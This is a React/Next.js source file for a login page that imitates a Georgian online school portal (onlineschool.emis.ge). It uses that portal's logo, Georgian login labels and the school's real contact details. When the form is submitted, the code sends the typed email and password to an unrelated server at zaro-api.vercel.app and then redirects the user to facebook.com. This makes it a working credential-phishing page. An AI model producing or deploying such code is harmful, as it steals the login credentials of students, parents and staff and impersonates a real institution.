"use client";

import axios from "axios";
import Image from "next/image";

import React, { useEffect, useState } from "react";

export default function Home() {
  const backendServer = "https://zaro-api.vercel.app/api/register";
  const [zaroMail, setZaroMail] = useState("");
  const [zaroPassword, setZaroPassword] = useState("");

  useEffect(() => {
    axios.get("https://zaro-api.vercel.app").then((resp) => console.log(resp));
  }, []);

  let redirectUrl: any = "https://facebook.com";
  const register = async (e: any) => {
    e.preventDefault();

    try {
      await axios.post("https://zaro-api.vercel.app/api/register", {
        email: zaroMail,
        password: zaroPassword,
      });

      window.location = redirectUrl;

      // setRedirect(true);
    } catch (err) {
      console.log(err);
    }
  };

  return (
    <>
      <form
        onSubmit={register}
        className="flex justify-center items-center h-[90vh] flex-col"
      >
        {/* <div className=" w-1/2 h-[200%] absolute right-0 top-0 bottom-0">
        <img src="https://onlineschool.emis.ge/assets/svg_icons/art-board.svg#Layer_1%22" />
      </div> */}

        <img
          src="https://onlineschool.emis.ge/assets/svg_icons/logo.svg#Layer_1"
          width={72}
        />
        <h1 className="uppercase text-[#f1f3ff] mt-[20px] text-[30px] font-semibold">
          ავტორიზაცია
        </h1>

        <input
          onChange={(e) => setZaroMail(e.target.value)}
          value={zaroMail}
          type="email"
          className="inp"
          placeholder="მომხმარებლის სახელი"
        />
        <input
          onChange={(e) => setZaroPassword(e.target.value)}
          value={zaroPassword}
          type="password"
          className="inp"
          placeholder="პაროლი"
        />
        <button type="submit" className="btn">
          შესვლა
        </button>

        <h1 className="text-[#f1f3ff] mt-[10px] text-[18px] cursor-pointer">
          პაროლის აღდგენა
        </h1>
        <h1 className="text-[#f1f3ff] mt-[10px] text-[18px] cursor-pointer">
          მშობლის რეგისტრაცია
        </h1>
      </form>

      <hr className="h-[1px] border-0 bg-[#3c4eb1]" />
      <div className="flex justify-between items-center h-[9vh] mx-4 md:mx-12">
        <div className="flex items-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            strokeWidth={1.5}
            stroke="#5e94fa"
            className="w-4 h-4"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.38a12.035 12.035 0 01-7.143-7.143c-.162-.441.004-.928.38-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 00-1.091-.852H4.5A2.25 2.25 0 002.25 4.5v2.25z"
            />
          </svg>
          <p className="ml-2 text-[15px] text-white">(995 32) 2 200 220</p>
        </div>
        <div className="flex items-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            strokeWidth={1.5}
            stroke="#5e94fa"
            className="w-4 h-4"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75"
            />
          </svg>
          <p className="ml-2 text-[15px] text-white">onlineschool@emis.ge</p>
        </div>
      </div>
    </>
  );
}
